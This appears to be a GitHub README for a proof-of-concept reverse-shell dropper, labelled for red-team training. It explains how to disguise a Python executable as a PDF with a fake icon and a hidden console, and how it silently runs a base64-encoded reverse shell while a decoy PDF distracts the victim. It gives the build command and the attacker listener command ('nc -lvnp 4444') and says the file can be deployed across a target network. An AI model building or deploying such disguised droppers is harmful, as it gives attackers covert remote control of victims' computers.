# reverse-shell-pdf-dropper
A proof-of-concept reverse shell dropper that opens a legit PDF while executing a base64-encoded payload. For red-team training only.


# 🐚 Reverse Shell PDF Dropper (PoC)

A proof-of-concept **reverse shell dropper** built with Python and PyInstaller.  
It silently executes a base64-encoded reverse shell payload while opening a real PDF document to distract the user.

> ⚠️ **This tool is for educational and red-team lab use only.**

---

## 🧩 Features

- 🔥 Executes a reverse shell payload **in memory**
- 📄 Opens a **legitimate PDF file** to distract the victim
- 🧬 Payload is embedded as **base64**
- 🔐 Uses `PyInstaller` to generate a single `.exe` file with a **PDF icon**

---

## 📁 Files in This Project

| File           | Description                                           |
|----------------|-------------------------------------------------------|
| `loader.py`    | Main dropper: decodes & runs the payload, opens PDF  |
| `payload.py`   | Python reverse shell payload                         |
| `test.pdf`     | Legit document shown to the victim                   |
| `pdf.ico`      | Fake PDF icon (optional)                             |
| `payload.b64`  | (Generated later — see below)                        |

---

## ⚙️ How to Use

### 1. Customize Your Payload

Edit `payload.py` and set your **attacker IP and port**:

```python
host = "YOUR_IP"
port = 4444
```

### 2. Generate payload.b64

From your terminal or PowerShell:
```
base64 payload.py > payload.b64
```
✅ This will create a file named payload.b64 in the same folder.

### 3. Build the Executable with PyInstaller
```
pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "payload.b64;." --add-data "test.pdf;." loader.py
```
A new standalone executable will be created in the dist/ directory:
```
dist/loader.exe
```
✅ This file can now be deployed to any host within the target network.

🧪 To test it:
Start a listener on your attacker machine:
```
nc -lvnp 4444
```
Run loader.exe on the target machine.

If successful:

The victim sees a legitimate PDF (test.pdf)
A reverse shell is silently established back to your listener
